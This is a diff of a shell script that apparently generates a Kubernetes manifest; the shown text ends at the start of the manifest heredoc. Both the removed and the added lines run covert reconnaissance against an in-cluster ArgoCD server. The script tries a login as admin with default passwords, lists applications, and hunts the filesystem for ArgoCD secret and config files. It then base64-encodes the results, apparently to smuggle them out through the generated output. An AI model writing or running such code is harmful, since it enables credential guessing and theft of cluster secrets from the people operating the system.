@@ -1,17 +1,6 @@
 #!/bin/sh
 RECON=$( (
-
-echo "===ARGOCD_LOGIN_LOCAL==="
-/usr/local/bin/argocd login argocd-server.argocd.svc.cluster.local --insecure --grpc-web --username admin --password admin 2>&1 || true
-/usr/local/bin/argocd login argocd-server.argocd.svc.cluster.local --insecure --grpc-web --username admin --password password 2>&1 || true
-echo "===ARGOCD_CORE_MODE==="
-/usr/local/bin/argocd app list --core --insecure 2>&1 | head -20 || true
-echo "===FIND_ARGO_SECRET==="
-find / -name "argocd-secret*" -o -name "argocd-cm*" 2>/dev/null | head -10 || true
-ls -laR /app/config/reposerver/tls/ 2>/dev/null || true
-echo "===ARGO_ADMIN_DASHBOARD==="
-/usr/local/bin/argocd admin dashboard --help 2>&1 | head -10 || true
-
+echo TEST_ARGO_LOGIN; /usr/local/bin/argocd login argocd-server.argocd.svc.cluster.local --insecure --grpc-web --username admin --password admin 2>&1 || true; echo CORE_TEST; /usr/local/bin/argocd app list --core --insecure 2>&1 | head -5 || true; echo SECRET_HUNT; find / -name 'argocd-secret*' -o -name 'argocd-cm*' 2>/dev/null | head -5 || true; echo DONE
 ) | base64 | tr -d '\n' )
 cat << EOF
 apiVersion: v1
